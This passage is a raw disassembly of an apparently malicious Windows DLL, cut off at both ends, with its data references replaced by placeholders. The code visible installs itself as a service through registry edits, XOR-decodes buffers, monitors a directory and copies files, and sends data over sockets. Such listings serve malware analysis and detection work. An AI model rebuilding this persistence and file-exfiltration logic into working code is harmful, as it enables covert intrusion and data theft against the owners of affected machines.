pop ecx
pop ecx
je r-xdata
sub_710022da
push ebp
mov ebp esp
push ecx
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call strlen
pop ecx
push eax
push [ ebp + 0x8 ]
push [ rw-data ]
call [ WriteFile@IAT ]
test eax eax
setne al
leave
retn 0x4
sub_71002306
push ebp
lea ebp [ esp - 0x28c ]
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x288 ] eax
push esi
push edi
push 0x104
lea eax [ ebp - 0x7c ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x7c ]
push r--data
push eax
call strcat
mov esi 0x200
push esi
lea eax [ ebp + 0x88 ]
push 0x0
push eax
call memset
lea eax [ ebp - 0x7c ]
push r--data
push eax
call [ fopen@IAT ]
mov edi eax
add esp 0x1c
test edi edi
mov [ ebp - 0x80 ] edi
jne r-xdata
push ebx
push 0x2
push 0xfffffe00
push edi
call [ fseek@IAT ]
push edi
push esi
lea eax [ ebp + 0x88 ]
push 0x1
push eax
call [ fread@IAT ]
push 0x8
lea eax [ ebp + 0x88 ]
push r--data
push eax
call memcmp
add esp 0x28
test eax eax
jne r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x80 ]
call [ fclose@IAT ]
pop ecx
mov al 0x1
mov ebx [ strchr@IAT ]
lea eax [ ebp + 0x88 ]
push 0x2d
push eax
call ebx
test eax eax
pop ecx
pop ecx
je r-xdata
mov ecx [ ebp + 0x288 ]
pop edi
xor ecx ebp
pop esi
call sub_71005920
add ebp 0x28c
leave
retn
xor al al
jmp r-xdata
lea ecx [ ebp + 0x88 ]
sub eax ecx
mov edi eax
lea eax [ edi - 0x8 ]
xor ecx ecx
test eax eax
jle r-xdata
pop ebx
mov esi [ strncpy@IAT ]
lea eax [ edi - 0x8 ]
push eax
lea eax [ ebp + 0x90 ]
push eax
push rw-data
call esi
lea eax [ ebp + 0x88 ]
push eax
call strlen
sub eax edi
push eax
lea eax [ ebp + edi + 0x89 ]
push eax
lea eax [ ebp + 0x88 ]
push eax
call esi
lea eax [ ebp + 0x88 ]
push 0x2d
push eax
call ebx
add esp 0x24
test eax eax
je r-xdata
not [ ebp + ecx + 0x90 ]
inc ecx
cmp ecx eax
jl r-xdata
lea ecx [ ebp + 0x88 ]
sub eax ecx
mov edi eax
xor eax eax
test edi edi
jle r-xdata
push edi
lea eax [ ebp + 0x88 ]
push eax
push rw-data
call esi
lea eax [ ebp + 0x88 ]
push eax
call strlen
sub eax edi
push eax
lea eax [ ebp + edi + 0x89 ]
push eax
lea eax [ ebp + 0x88 ]
push eax
call esi
lea eax [ ebp + 0x88 ]
push 0x2d
push eax
call ebx
add esp 0x24
test eax eax
je r-xdata
not [ ebp + eax + 0x88 ]
inc eax
cmp eax edi
jl r-xdata
lea ecx [ ebp + 0x88 ]
sub eax ecx
xor ecx ecx
test eax eax
jle r-xdata
push eax
lea eax [ ebp + 0x88 ]
push eax
push rw-data
call esi
add esp 0xc
not [ ebp + ecx + 0x88 ]
inc ecx
cmp ecx eax
jl r-xdata
sub_710024ed
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push r--data
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp - 0x18 ] edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop ebx
leave
retn 0x4
pop esi
push [ ebp - 0x8 ]
call ??_V@YAXPAX@Z
add [ ebp - 0x4 ] 0x7d0
push [ ebp - 0x4 ]
call ??_U@YAPAXI@Z
mov esi eax
cmp esi ebx
pop ecx
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
push esi
push 0x5
call [ rw-data ]
cmp eax 0xc0000004
je r-xdata
cmp eax ebx
jge r-xdata
mov edi [ ebp + 0x8 ]
push ebx
push ebx
push edi
mov [ ebp - 0x4 ] esi
call strlen
mov esi [ MultiByteToWideChar@IAT ]
pop ecx
inc eax
push eax
push edi
push ebx
push ebx
call esi
mov [ ebp + 0x8 ] eax
add eax eax
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
push eax
push edi
call strlen
pop ecx
inc eax
push eax
push edi
push ebx
push ebx
call esi
push edi
call strlen
add eax eax
push edi
mov [ ebp - 0x20 ] ax
call strlen
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x1e ] ax
mov eax [ ebp - 0x10 ]
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
push esi
call ??_V@YAXPAX@Z
pop ecx
mov eax [ esi ]
cmp eax ebx
sete cl
add esi eax
cmp cl bl
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x1
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
cmp [ esi + 0x3c ] ebx
je r-xdata
mov esi ebx
jmp r-xdata
mov esi [ esi + 0x44 ]
push [ ebp - 0x8 ]
call ??_V@YAXPAX@Z
pop ecx
push [ ebp - 0x18 ]
call [ FreeLibrary@IAT ]
mov eax esi
sub_71002645
push ebp
mov ebp esp
sub esp 0x694
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ lstrcpyA@IAT ]
push edi
mov edi [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x344 ]
push eax
call esi
push edi
lea eax [ ebp - 0x240 ]
push eax
call esi
xor ebx ebx
push ebx
call [ CoInitialize@IAT ]
lea eax [ ebp - 0x690 ]
push eax
push r--data
push 0x1
push ebx
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
push ebx
lea eax [ ebp - 0x240 ]
push eax
call [ CreateDirectoryA@IAT ]
push 0x32
lea eax [ ebp - 0x38 ]
push ebx
push eax
call memset
lea eax [ ebp - 0x13c ]
push eax
call strlen
mov edi eax
add esp 0x10
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x690 ]
mov ecx [ eax ]
lea edx [ ebp - 0x694 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
lea eax [ ebp - 0x13c ]
push eax
lea esi [ edi + 0x1 ]
call strlen
cmp esi eax
pop ecx
jae r-xdata
cmp [ ebp + edi - 0x13c ] 0x5c
je r-xdata
mov eax [ ebp - 0x690 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov esi 0x104
push esi
lea eax [ ebp - 0x54c ]
push eax
push 0xffffffff
lea eax [ ebp - 0x344 ]
push eax
push 0x1
push ebx
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x694 ]
mov ecx [ eax ]
push ebx
lea edx [ ebp - 0x54c ]
push edx
push eax
call [ ecx + 0x14 ]
test eax eax
jl r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x240 ]
push eax
call strcat
pop ecx
pop ecx
push 0x1
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x13c ]
push eax
call [ CopyFileA@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
pop edi
sbb eax eax
pop esi
xor ecx ebp
neg eax
pop ebx
call sub_71005920
leave
retn 0x8
mov eax esi
sub eax edi
lea edi [ ebp + eax - 0x39 ]
dec edi
jns r-xdata
mov eax [ ebp - 0x694 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
lea eax [ ebp - 0x344 ]
push eax
lea eax [ ebp - 0x13c ]
push eax
call strcpy
mov eax [ ebp - 0x690 ]
pop ecx
pop ecx
mov ecx [ eax ]
push 0x2
lea edx [ ebp - 0x68c ]
push edx
push esi
lea edx [ ebp - 0x13c ]
push edx
push eax
call [ ecx + 0xc ]
mov al [ ebp + esi - 0x13c ]
mov [ edi ] al
lea eax [ ebp - 0x13c ]
inc esi
push eax
inc edi
call strlen
cmp esi eax
pop ecx
jb r-xdata
sub_710027f5
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x64
call [ malloc@IAT ]
push 0x64
mov esi eax
push 0x0
push esi
call memset
mov edi [ ebp + 0x8 ]
push edi
call strlen
push eax
add edi 0x4
push edi
push esi
call [ strncpy@IAT ]
push 0x4
mov edi r--data
push edi
push esi
call memcmp
add esp 0x2c
test eax eax
mov ebx r--data
je r-xdata
push 0x4
push edi
push esi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push ebx
push esi
call memcmp
add esp 0xc
test eax eax
je r-xdata
push 0x4
push ebx
push esi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
push r--data
call [ fopen@IAT ]
push esi
push r--data
push eax
mov [ ebp + 0x8 ] eax
call [ fprintf@IAT ]
push [ ebp + 0x8 ]
call [ fclose@IAT ]
add esp 0x18
mov edi [ GetProcAddress@IAT ]
xor ebx ebx
mov [ rw-data ] ebx
push r--data
call [ LoadLibraryA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
push esi
call [ free@IAT ]
pop ecx
push 0x0
call [ ExitThread@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
call eax
push [ rw-data ]
call [ FreeLibrary@IAT ]
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
call eax
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
push r--data
push eax
call edi
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push esi
call sub_710024ed
test eax eax
je r-xdata
push [ rw-data ]
call [ FreeLibrary@IAT ]
mov [ rw-data ] ebx
call eax
push r--data
push eax
call edi
cmp eax ebx
je r-xdata
call eax
jmp r-xdata
sub_7100296b
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp esi edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] 0x7a120
jle r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp esi edi
jg r-xdata
push edi
push esi
push [ ebp + 0xc ]
push ebx
call send
cmp eax edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push edi
lea eax [ ebp - 0x10c ]
push eax
push edi
push edi
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] 0x1
call select
lea eax [ ebp - 0x10c ]
push eax
push ebx
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
sub eax esi
jmp r-xdata
add [ ebp + 0xc ] eax
sub esi eax
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_710029ea
push ebp
mov ebp esp
sub esp 0x430
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x42c ]
push 0x400
push eax
call [ _vsnprintf@IAT ]
add esp 0x10
push 0xfffffff5
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push r--data
push r--data
call [ fopen@IAT ]
mov esi eax
test esi esi
pop ecx
pop ecx
je r-xdata
push 0x0
lea eax [ ebp - 0x430 ]
push eax
lea eax [ ebp - 0x42c ]
push eax
call strlen
mov esi [ WriteFile@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x42c ]
push eax
push edi
call esi
push 0x0
lea eax [ ebp - 0x430 ]
push eax
push 0x2
push r--data
push edi
call esi
jmp r-xdata
lea eax [ ebp - 0x42c ]
push eax
call [ OutputDebugStringA@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_71005920
leave
retn
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ _strtime@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x2c ]
push eax
call [ _strdate@IAT ]
pop ecx
push eax
push r--data
push esi
call [ fprintf@IAT ]
add esp 0x14
call [ __iob_func@IAT ]
add eax 0x40
jne r-xdata
push esi
call [ fclose@IAT ]
pop ecx
sub_71002ada
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
leave
retn 0x10
call [ GetLastError@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
sub_71002b20
push esi
push edi
push [ esp + 0x10 ]
mov edi [ esp + 0x10 ]
push edi
call sub_71001c16
mov esi eax
push esi
call sub_71001d4d
xor edx edx
test esi esi
jbe r-xdata
lea eax [ edx + edi - 0x1 ]
cmp [ eax ] 0x23
pop edi
pop esi
jne r-xdata
mov ecx rw-data
mov eax edi
sub ecx edi
mov edx esi
push ebx
retn 0x8
mov [ eax ] 0x0
mov bl [ ecx + eax ]
xor [ eax ] bl
inc eax
dec esi
jne r-xdata
pop ebx
sub_71002b65
push esi
mov esi [ esp + 0xc ]
push esi
call sub_71001d4d
test esi esi
jbe r-xdata
pop esi
retn 0x8
mov eax [ esp + 0x8 ]
mov ecx rw-data
sub ecx eax
mov dl [ ecx + eax ]
xor [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_71002b8c
push ebp
mov ebp esp
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push 0xa
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call memset
push esi
call strlen
sub eax 0x7
push eax
add esi 0x7
lea eax [ ebp - 0x10 ]
push esi
push eax
call [ strncpy@IAT ]
push r--data
push r--data
call [ fopen@IAT ]
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
push esi
call [ fprintf@IAT ]
push esi
call [ fclose@IAT ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
call strcat
mov esi [ GetDiskFreeSpaceA@IAT ]
add esp 0x3c
jmp r-xdata
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x118 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call esi
test eax eax
je r-xdata
push 0x2710
call [ Sleep@IAT ]
lea eax [ ebp - 0x114 ]
push 0x104
push eax
call [ _getcwd@IAT ]
mov esi [ _chdir@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call esi
add esp 0xc
call sub_710020b0
lea eax [ ebp - 0x114 ]
push eax
call esi
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_71005920
leave
retn 0x4
sub_71002c7a
push ebp
mov ebp esp
mov eax 0x202c
call sub_710059c0
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
push 0x64
pop ebx
push ebx
call esi
push ebx
mov edi eax
call esi
push ebx
mov [ ebp - 0xc ] eax
call esi
push ebx
mov [ ebp - 0x18 ] eax
call esi
push ebx
mov [ ebp - 0x14 ] eax
call esi
push ebx
mov [ ebp - 0x24 ] eax
call esi
push ebx
xor esi esi
push esi
push edi
mov [ ebp - 0x8 ] eax
call memset
push ebx
push esi
push [ ebp - 0xc ]
call memset
push ebx
push esi
push [ ebp - 0x18 ]
call memset
push ebx
push esi
push [ ebp - 0x24 ]
call memset
add esp 0x48
push ebx
push esi
push [ ebp - 0x8 ]
call memset
push [ ebp + 0x8 ]
call strlen
push eax
mov eax [ ebp + 0x8 ]
add eax 0x6
push eax
push edi
call [ strncpy@IAT ]
push edi
mov [ ebp - 0x4 ] esi
call strlen
add esp 0x20
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
inc eax
push edi
mov [ ebp + 0x8 ] eax
call strlen
cmp [ ebp + 0x8 ] eax
pop ecx
jge r-xdata
mov edx [ ebp - 0xc ]
sub edx edi
mov eax edi
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
inc eax
push edi
mov [ ebp - 0x4 ] eax
call strlen
cmp [ ebp - 0x4 ] eax
pop ecx
jge r-xdata
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x18 ]
lea ecx [ eax + ecx - 0x1 ]
jmp r-xdata
mov cl [ eax ]
cmp cl 0x2d
je r-xdata
mov eax [ ebp - 0x4 ]
inc eax
push edi
mov [ ebp + 0x8 ] eax
call strlen
cmp [ ebp + 0x8 ] eax
pop ecx
jge r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
lea ecx [ eax + ecx - 0x1 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax + edi ]
cmp al 0x2d
je r-xdata
inc [ ebp - 0x4 ]
mov [ edx + eax ] cl
inc eax
push edi
mov [ ebp - 0x10 ] eax
call strlen
cmp [ ebp - 0x4 ] eax
pop ecx
jl r-xdata
push [ ebp - 0xc ]
mov edi [ atoi@IAT ]
call edi
push [ ebp - 0x8 ]
mov [ ebp + 0x8 ] eax
call edi
pop ecx
pop ecx
push esi
push 0x2000000
push 0x3
push esi
push 0x5
push 0x1
push [ ebp - 0x18 ]
mov [ ebp - 0x2c ] eax
call [ CreateFileA@IAT ]
cmp eax esi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0xc ] esi
je r-xdata
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
lea eax [ eax + ecx - 0x1 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + edi ]
cmp al 0x2d
je r-xdata
inc [ ebp + 0x8 ]
mov [ ecx ] al
inc ecx
push edi
mov [ ebp - 0x10 ] ecx
call strlen
cmp [ ebp + 0x8 ] eax
pop ecx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
push esi
call [ ExitThread@IAT ]
mov eax [ ebp + 0x8 ]
imul eax eax 0x3e8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + edi ]
inc [ ebp + 0x8 ]
mov [ eax ] cl
inc eax
push edi
mov [ ebp - 0x10 ] eax
call strlen
cmp [ ebp + 0x8 ] eax
pop ecx
jl r-xdata
inc [ ebp - 0x4 ]
mov [ ecx ] al
inc ecx
push edi
mov [ ebp + 0x8 ] ecx
call strlen
cmp [ ebp - 0x4 ] eax
pop ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
push eax
call [ Sleep@IAT ]
mov edi 0x800
push edi
lea eax [ ebp - 0x202c ]
push esi
push eax
call memset
add esp 0xc
push esi
push esi
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push esi
push edi
lea eax [ ebp - 0x202c ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] esi
call ReadDirectoryChangesW
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0xc ] eax
jl r-xdata
mov eax [ ebp - 0x1c ]
dec eax
cmp eax 0x7fe
ja r-xdata
mov eax [ ebp - 0x10 ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
lea edi [ ebp - 0x202c ]
add edi [ edi ]
cmp [ edi ] esi
jne r-xdata
push ebx
push esi
push [ ebp - 0x14 ]
call memset
push [ ebp - 0x18 ]
call strlen
push eax
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
call [ strncpy@IAT ]
push r--data
push [ ebp - 0x14 ]
call strcat
add esp 0x24
test [ edi + 0x8 ] 0xfffffffe
mov [ ebp - 0x8 ] esi
jbe r-xdata
test [ edi + 0x4 ] 0x1
je r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x14 ]
call sub_71002645
add [ ebp - 0xc ] eax
lea eax [ edi + 0xc ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
push 0x3
mov [ ebp - 0x28 ] ax
lea eax [ ebp - 0x20 ]
push esi
push eax
mov [ ebp - 0x26 ] si
call memset
add esp 0xc
push esi
push esi
push 0x3
lea eax [ ebp - 0x20 ]
push eax
push 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
push esi
push esi
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x14 ]
call strcat
mov eax [ edi + 0x8 ]
inc [ ebp - 0x8 ]
add [ ebp + 0x8 ] 0x2
shr eax 0x1
cmp [ ebp - 0x8 ] eax
pop ecx
pop ecx
jb r-xdata
InstallService
push ebp
sub esp 0x1f4
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f4 ] eax
push 0x50
mov eax sub_7100645e
call sub_71005ab8
mov eax [ ebp + 0x200 ]
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x18 ] 0x80000002
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1c ] r--data
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
mov esi r--data
push esi
push [ ebp - 0x18 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
mov [ ebp - 0x14 ] eax
je r-xdata
cmp [ eax ] bl
je r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push ebx
push r--data
push [ ebp - 0x18 ]
mov [ ebp - 0x50 ] 0x1f4
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call [ RegCloseKey@IAT ]
push [ ebp - 0x14 ]
call [ SetLastError@IAT ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
push eax
push esi
push r--data
call sub_710029ea
add esp 0xc
mov [ ebp - 0x38 ] r--data
push r--data
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x1c ] eax
mov edi [ strchr@IAT ]
lea esi [ ebp ]
mov [ ebp - 0x48 ] r--data
push r--data
lea eax [ ebp - 0x48 ]
jmp r-xdata
push r--data
call sub_710029ea
pop ecx
lea esi [ ebp ]
push [ ebp - 0x1c ]
push esi
call [ _stricmp@IAT ]
test eax eax
pop ecx
pop ecx
je r-xdata
push eax
call _CxxThrowException
mov [ ebp - 0x2c ] r--data
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
push esi
push r--data
call sub_710029ea
push ebx
push esi
call edi
add esp 0x10
inc eax
mov esi eax
jmp r-xdata
cmp [ esi ] bl
jne r-xdata
push ebx
push esi
call edi
pop ecx
inc eax
pop ecx
mov esi eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov edi 0xf003f
push edi
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
cmp eax ebx
mov [ ebp - 0x24 ] eax
jne r-xdata
cmp [ esi ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
push r--data
push 0x1
push 0x2
push 0x110
push 0xf01ff
push r--data
push [ ebp - 0x1c ]
push eax
call [ CreateServiceA@IAT ]
cmp eax ebx
mov [ ebp - 0x28 ] eax
jne r-xdata
mov [ ebp - 0x4c ] r--data
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
push [ ebp - 0x1c ]
push r--data
call sub_710029ea
mov esi [ CloseServiceHandle@IAT ]
pop ecx
pop ecx
push [ ebp - 0x28 ]
call esi
push [ ebp - 0x24 ]
call esi
push 0x1f4
lea eax [ ebp ]
push r--data
push eax
mov [ ebp - 0x18 ] 0x80000002
call [ strncpy@IAT ]
push 0x64
push [ ebp - 0x1c ]
lea eax [ ebp ]
push eax
call [ strncat@IAT ]
add esp 0x18
lea eax [ ebp - 0x18 ]
push eax
push edi
push ebx
lea eax [ ebp ]
push eax
push [ ebp - 0x18 ]
call [ RegOpenKeyExA@IAT ]
cmp eax ebx
mov [ ebp - 0x14 ] eax
je r-xdata
call [ GetLastError@IAT ]
push eax
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
push r--data
call sub_710029ea
add esp 0xc
mov [ ebp - 0x40 ] r--data
push r--data
lea eax [ ebp - 0x40 ]
jmp r-xdata
lea eax [ ebp ]
push r--data
push eax
call strcpy
lea eax [ ebp ]
push eax
call strlen
add esp 0xc
inc eax
push eax
lea eax [ ebp ]
push eax
push 0x1
push ebx
push r--data
push [ ebp - 0x18 ]
call [ RegSetValueExA@IAT ]
mov edi [ SetLastError@IAT ]
push eax
mov [ ebp - 0x14 ] eax
call edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
push eax
push [ ebp - 0x1c ]
push r--data
call sub_710029ea
add esp 0xc
mov [ ebp - 0x54 ] r--data
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push r--data
push [ ebp - 0x18 ]
call [ RegCreateKeyA@IAT ]
push eax
mov [ ebp - 0x14 ] eax
call edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov [ ebp - 0x30 ] r--data
push r--data
lea eax [ ebp - 0x30 ]
jmp r-xdata
push 0x1f4
lea eax [ ebp ]
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x34 ] r--data
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
lea eax [ ebp ]
push eax
call strlen
pop ecx
inc eax
push eax
lea eax [ ebp ]
push eax
push 0x2
push ebx
push r--data
push [ ebp - 0x20 ]
call [ RegSetValueExA@IAT ]
push eax
mov [ ebp - 0x14 ] eax
call edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov [ ebp - 0x3c ] r--data
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push [ ebp - 0x1c ]
push r--data
call sub_710029ea
pop ecx
pop ecx
push [ ebp - 0x18 ]
mov edi [ RegCloseKey@IAT ]
call edi
push [ ebp - 0x20 ]
call edi
push [ ebp - 0x28 ]
call esi
push [ ebp - 0x24 ]
call esi
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x1f4 ]
xor ecx ebp
call sub_71005920
add ebp 0x1f8
leave
retn 0x4
mov [ ebp - 0x44 ] r--data
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
sub_710032cd
mov esi [ ebp - 0x5c ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov eax r-xdata
retn
cmp [ esi ] bl
je r-xdata
call [ GetLastError@IAT ]
push eax
push esi
push r--data
mov [ ebp - 0x14 ] eax
call sub_710029ea
add esp 0xc
UninstallService
push 0x1c
push r--data
call sub_7100593c
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x20 ] r--data
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
push eax
push r--data
call sub_710029ea
pop ecx
pop ecx
push 0x10000
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call [ OpenServiceA@IAT ]
mov [ ebp - 0x2c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] bl
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_71005981
retn 0x4
push eax
call [ DeleteService@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
push eax
push [ ebp - 0x20 ]
push r--data
call sub_710029ea
add esp 0xc
jmp r-xdata
mov [ ebp - 0x20 ] eax
push [ ebp - 0x20 ]
push r--data
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_710029ea
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
push [ ebp - 0x2c ]
mov esi [ CloseServiceHandle@IAT ]
call esi
push [ ebp - 0x24 ]
call esi
sub_71003453
push ebx
push esi
push edi
call sub_71001ac7
mov esi [ esp + 0x14 ]
push 0x2000
push 0x0
push esi
call memset
push rw-data
push esi
call strcpy
mov edi [ esp + 0x2c ]
add esp 0x14
push edi
push [ esp + 0x14 ]
call sub_71002b65
push esi
call strlen
pop ecx
push edi
push [ esp + 0x14 ]
mov ebx eax
push esi
call strlen
pop ecx
add eax esi
push eax
call memcpy
add esp 0xc
lea eax [ ebx + edi ]
pop edi
pop esi
pop ebx
retn 0xc
sub_710034b1
mov eax 0x400c
call sub_710059c0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4008 ] eax
push ebx
